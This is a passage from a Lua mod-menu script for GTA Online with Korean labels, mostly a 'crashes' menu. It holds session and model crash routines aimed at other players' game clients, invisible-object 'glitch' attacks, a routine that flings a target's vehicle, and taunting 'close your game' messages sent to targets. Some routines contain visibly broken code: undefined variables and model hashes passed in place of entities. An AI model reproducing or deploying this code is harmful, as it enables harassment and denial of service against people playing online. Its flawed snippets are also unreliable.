        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 1, 0))
        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 0, 0))
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)
        util.yield()
        entities.delete_by_handle(dumb_object_front)
        entities.delete_by_handle(dumb_object_back)
        util.yield()
    end)


    local glitch_player_list = menu.list(glitchiar, "글리치 플레이어", {"glitchdelay"}, "")
    local object_stuff = {
        names = {
            "페리스 휠",
            "UFO",
            "시멘트 믹서",
            "스카폴딩",
            "트렁그 문",
            "큰 볼링공",
            "큰 축구공",
            "큰 노랑공",
            "스턴트 램프",

        },
        objects = {
            "prop_ld_ferris_wheel",
            "p_spinning_anus_s",
            "prop_staticmixer_01",
            "prop_towercrane_02a",
            "des_scaffolding_root",
            "prop_sm1_11_garaged",
            "stt_prop_stunt_bowling_ball",
            "stt_prop_stunt_soccer_ball",
            "prop_juicestand",
            "stt_prop_stunt_jump_l",
        }
    }

    local object_hash = util.joaat("prop_ld_ferris_wheel")
    menu.list_select(glitch_player_list, "객체", {"glitchplayer"}, "글치치 사용자 입니다.", object_stuff.names, 1, function(index)
        object_hash = util.joaat(object_stuff.objects[index])
    end)

    menu.slider(glitch_player_list, "느린 생성", {"spawndelay"}, "", 0, 3000, 50, 10, function(amount)
        delay = amount
    end)

    local glitchPlayer = false
    local glitchPlayer_toggle
    glitchPlayer_toggle = menu.toggle(glitch_player_list, "플레이어", {}, "", function(toggled)
        glitchPlayer = toggled

        while glitchPlayer do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("멀리 떨어진 선수. :c")
                menu.set_value(glitchPlayer_toggle, false);
            break end

            if not players.exists(player_id) then
                util.toast("플레이어는 존재하지 않습니다. :c")
                menu.set_value(glitchPlayer_toggle, false);
            break end
            local glitch_hash = object_hash
            local poopy_butt = util.joaat("rallytruck")
            request_model(glitch_hash)
            request_model(poopy_butt)
            local stupid_object = entities.create_object(glitch_hash, pos)
            local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(delay)
            entities.delete_by_handle(stupid_object)
            entities.delete_by_handle(glitch_vehicle)
            util.yield(delay)    
        end
    end)

    local glitchVeh = false
    local glitchVehCmd
    glitchVehCmd = menu.toggle(glitchiar, "글리치 차량", {"glitchvehicle"}, "", function(toggle) -- jinx <3
        glitchVeh = toggle
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_model = players.get_vehicle_model(player_id)
        local ped_hash = util.joaat("a_m_m_acult_01")
        local object_hash = util.joaat("prop_ld_ferris_wheel")
        request_model(ped_hash)
        request_model(object_hash)
        
        while glitchVeh do
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("멀리 떨어진 선수. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not players.exists(player_id) then 
                util.toast("플레이어는 존재하지 않습니다. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then
                util.toast("그 선수는 차에 있지 않습니다. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("자리가 없어요. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
            local glitch_obj = entities.create_object(object_hash, pos)
            local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
            local things = {glitched_ped, glitch_obj}

            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)

            ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)

            for i, spawned_objects in ipairs(things) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
                ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
                ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
            end

            for i = 0, seat_count -1 do
                if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                    local emptyseat = i
                    for l = 1, 25 do
                        PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                        ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                        util.yield()
                    end
                end
            end
            if not menu.get_value(glitchVehCmd) then
                entities.delete_by_handle(glitched_ped)
                entities.delete_by_handle(glitch_obj)
            end
            if glitched_ped ~= nil then
                entities.delete_by_handle(glitched_ped) 
            end
            if glitch_obj ~= nil then 
                entities.delete_by_handle(glitch_obj)
            end
        end
    end)

    menu.action_slider(glitchiar, "선수 자동차 출시", {}, "", launch_vehicle, function(index, value)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            util.toast("차 안에 없어요 D:")
            return
        end

        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            util.yield()
        end

        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
            util.toast("차량을 제어할 수 없습니다. D:")
            return
        end

        switch value do
            case "Lanzar Arriba":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Adelante":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Atras":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, -100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Abajo":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, -100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Catapulta":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            end
        end)





    crashes = menu.list(malicious, "크레쉬", {}, "크레쉬 Op", function(); end)

    local begcrash = {
		"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Please close your game, please please please please please",
	}

    menu.action(crashes, "프레임 충돌", {}, "인기 메뉴에 의해 차단됨", function()
		menu.trigger_commands("smstext" .. PLAYER.GET_PLAYER_NAME(player_id).. " " .. begcrash[math.random(1, #begcrash)])
		util.yield()
		menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(player_id))
	end)

    -- Prisuhm crash
    menu.action(crashes, "모델 V1", {"crashv1"}, "인기 메뉴 - 스탠드", function()
        local mdl = util.joaat('a_c_poodle')
        BlockSyncs(player_id, function()
            if request_model(mdl, 2) then
                local pos = players.get_position(player_id)
                util.yield(100)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 3, 0), 0)
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1500)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1000)
            else
                util.toast("모델 로드 중 오류가 발생했습니다.")
            end
        end)
    end)

    --menu.action(crashes, "Test", {""}, "", function()
    --    local user = players.user()
    --    local user_ped = players.user_ped()
    --    local pos = players.get_position(user)
    --    BlockSyncs(player_id, function() 
    --        util.yield(100)
    --        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
    --        util.yield()
    --        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
    --        util.yield(250)
    --        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
    --        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
    --        util.yield(1000)
    --        for i = 1, 5 do
    --            util.spoof_script("freemode", SYSTEM.WAIT)
    --        end
    --        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
    --        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
    --    end)
    --end)

    menu.divider(crashes, "세션")

    menu.action(crashes, "세션 크래쉬 V1", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local hashes = {2132890591, 2727244247}
        local pc = players.get_position(player_id)
        local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
        local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
        local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
        local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
        util.yield(1000)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        entities.delete_by_handle(veh); entities.delete_by_handle(ped)
        PHYSICS.DELETE_CHILD_ROPE(rope)
        PHYSICS.ROPE_UNLOAD_TEXTURES()
    end)

    menu.action(crashes, "세션 크래쉬 V2", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        pos.x = pos.x+5
        ppos.z = ppos.z+1
        cargobob = entities.create_vehicle(2132890591, pos, 0)
        cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
        kur = entities.create_ped(26, 2727244247, ppos, 0)
        kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
        ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
        newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    end)

    menu.action(crashes, "세션 크래쉬 V3", {}, "", function()
        for i = 1, 10 do
            util.trigger_script_event(1 << player_id, {243072129, player_id, 1, player_id, 0, 1, 0})  
        end
    end)

    menu.action(crashes, "세션 크래쉬 V4", {"crashv27"}, "x-force에게 이것을 추천 (Big CHUNGUS)", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local mdl3 = util.joaat("A_F_M_ProlHost_01")
        local mdl4 = util.joaat("A_M_M_SouCent_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        util.request_model(mdl3)
        util.request_model(mdl4)
        for i = 1, 250 do
            local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
            local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
            util.yield(300)
            local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
            local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            util.yield(300)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
            
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            util.yield(300)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)

            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            util.yield(300)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(mdl3)
        entities.delete_by_handle(mdl4)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
    end)



    menu.divider(crashes, "(Ryze독점 스크립트)")

    menu.action(crashes, "크래쉬 V1", {}, "중국식 크래쉬.", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local mdl = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(mdl) do
            STREAMING.REQUEST_MODEL(mdl)
            util.yield(5)
        end

        local ped = {}
        for i = 1, 10 do 
            local coord = ENTITY.GET_ENTITY_COORDS(player, true)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            ped[i] = entities.create_ped(0, mdl, coord, 0)

            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)

            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(player_id) .. " explode " .. PLAYER.GET_PLAYER_NAME(player_id) .. " ")

            ENTITY.SET_ENTITY_VISIBLE(ped[i], true)
            util.yield(25)
        end
        util.yield(2500)
        for i = 1, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(25)
        end

    end)
    
    --[[
            menu.toggle(crashes, "Crasheo V2 'Test'", {}, "Crasheo alberca >.<", function(on)
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if on then
            trigger_command("godmode on")
            util.yield(10)
            trigger_command("otr on")
            util.yield(10)
            trigger_command("invisibility on")
            util.yield(50)
    
            
    
            ENTITY.ATTACH_ENTITY_TO_ENTITY(PLAYER.PLAYER_PED_ID(), p, 0, 0, 0, 0, 0, 0, 0, false, true, false, false, 0, true)
            trigger_command("mpfemale")
            util.yield(25)
            trigger_command("mpmale")
            util.yield(25)
            if not players.exists(pid) then
                PackPoolCrash = false
            end

        else
            ryze.PapuCrash = false
            util.yield(25)
            ENTITY.DETACH_ENTITY(PLAYER.PLAYER_PED_ID(), true, false)
            trigger_command("godmode off")
            util.yield(10)
            trigger_command("otr off")
            util.yield(10)
            trigger_command("invisibility off")
            util.yield(10)
            trigger_command("outfitdefault")
        end
    end)

    ]]

    local twotake = menu.list(crashes, "2T1 크래쉬", {}, "")

    local modelc = menu.list(twotake, "모델 크래쉬", {}, "")


    menu.action(modelc, "모델 크래쉬 V1", {"crashv4"}, "", function()
        BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)
    end)

    menu.action(modelc, "모델 크래쉬 V2", {"crashv5"}, "", function()
        BlockSyncs(player_id, function()
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            entities.delete_by_handle(object)
            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
            util.yield(1000)
            entities.delete_by_handle(object)
        end)

    end)

    menu.action(modelc, "모델 크래쉬 V3", {"crashv10"}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local hash = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            STREAMING.REQUEST_MODEL(hash)
            util.yield(5)
        end
        --coord.z -= 1
        local ped = {}
        for i = 0, 10 do
            local coord = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
            ped[i] = entities.create_ped(0, hash, coord, 0)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
            --FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pedcoord.x, pedcoord.y, pedcoord.z, 5, 10, false, false, 0)
            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(player_id) .. " explode " .. PLAYER.GET_PLAYER_NAME(player_id) .. " ")
            ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
        util.yield(25)
        end
        util.yield(2500)
        for i = 0, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(10)
        end

    end)

    menu.action(modelc, "모델 크래쉬 V4", {"crashv12"}, "", function(on_toggle)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
